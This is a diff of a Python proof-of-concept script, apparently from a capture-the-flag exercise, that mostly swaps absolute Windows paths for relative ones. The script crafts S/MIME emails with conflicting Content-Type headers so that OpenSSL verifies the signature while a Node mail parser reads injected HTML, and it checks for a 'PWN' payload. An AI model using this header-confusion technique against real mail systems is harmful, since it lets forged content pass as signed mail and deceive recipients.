@@ -8,13 +8,13 @@ so the outer header block ends with:   Content-Type : text/html
    while OpenSSL (looks up the first Content-Type) still sees the real multipart/signed.
 """
 import base64, subprocess, os, sys, json, re
-sys.path.insert(0, r'D:\ctf-index')
+sys.path.insert(0, r'.')
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email._policybase import Policy as _P
 _P.verify_generated_headers = False
 
-EML = r'D:\ctf-index\_z_496_emls'
+EML = r'./_z_496_emls'
 WSL = lambda cmd: subprocess.run(['wsl', '-d', 'kali-linux', '--', 'bash', '-lc', cmd],
                                  capture_output=True, text=True)
 os.makedirs(EML, exist_ok=True)
@@ -34,7 +34,7 @@ def mk_D(extra_cte):
     return d
 
 
-TEMPLATE = open(r'D:\ctf-index\_z_496\template.jinja2').read()
+TEMPLATE = open(r'./_z_496\template.jinja2').read()
 
 
 def build(D, tag):
@@ -48,8 +48,8 @@ def build(D, tag):
              '--' + B1 + '--\n')
     with open(os.path.join(EML, 'inner_%s.txt' % tag), 'w', newline='') as f:
         f.write(inner)
-    r = WSL('cd /tmp/ostest && openssl cms -sign -in /mnt/d/ctf-index/_z_496_emls/inner_%s.txt '
-            '-signer cert.pem -inkey key.pem -outform SMIME -out /mnt/d/ctf-index/_z_496_emls/signed_%s.eml -md sha256'
+    r = WSL('cd /tmp/ostest && openssl cms -sign -in ./_z_496_emls/inner_%s.txt '
+            '-signer cert.pem -inkey key.pem -outform SMIME -out ./_z_496_emls/signed_%s.eml -md sha256'
             % (tag, tag))
     if r.returncode != 0:
         print('sign failed', r.stderr[:300]); return
@@ -72,7 +72,7 @@ def build(D, tag):
     print('=' * 20, tag, '=' * 20)
     print('--- outer header block (repr, tail) ---')
     print(repr(head[-420:]))
-    r = WSL('node /mnt/d/ctf-index/_z_496_parse.js /mnt/d/ctf-index/_z_496_emls/reply_%s.eml' % tag)
+    r = WSL('node ./_z_496_parse.js ./_z_496_emls/reply_%s.eml' % tag)
     try:
         j = json.loads(r.stdout)
         print('TOP parse: from=%r html=%r text=%r' % (
@@ -80,11 +80,11 @@ def build(D, tag):
         print('TOP html truthy:', bool(j.get('html')))
     except Exception:
         print('parse out:', r.stdout[:300], r.stderr[:300])
-    r = WSL('cd /tmp/ostest && openssl cms -verify -in /mnt/d/ctf-index/_z_496_emls/reply_%s.eml '
-            '-CAfile cert.pem -out /mnt/d/ctf-index/_z_496_emls/out_%s.eml; echo RC=$?' % (tag, tag))
+    r = WSL('cd /tmp/ostest && openssl cms -verify -in ./_z_496_emls/reply_%s.eml '
+            '-CAfile cert.pem -out ./_z_496_emls/out_%s.eml; echo RC=$?' % (tag, tag))
     print('verify:', r.stdout.strip().splitlines()[-1] if r.stdout.strip() else r.stderr[:200])
     if 'RC=0' in r.stdout:
-        r2 = WSL('node /mnt/d/ctf-index/_z_496_parse.js /mnt/d/ctf-index/_z_496_emls/out_%s.eml' % tag)
+        r2 = WSL('node ./_z_496_parse.js ./_z_496_emls/out_%s.eml' % tag)
         try:
             j2 = json.loads(r2.stdout)
             print('VERIFIED parse html == PWN:', j2.get('html') == PWN)
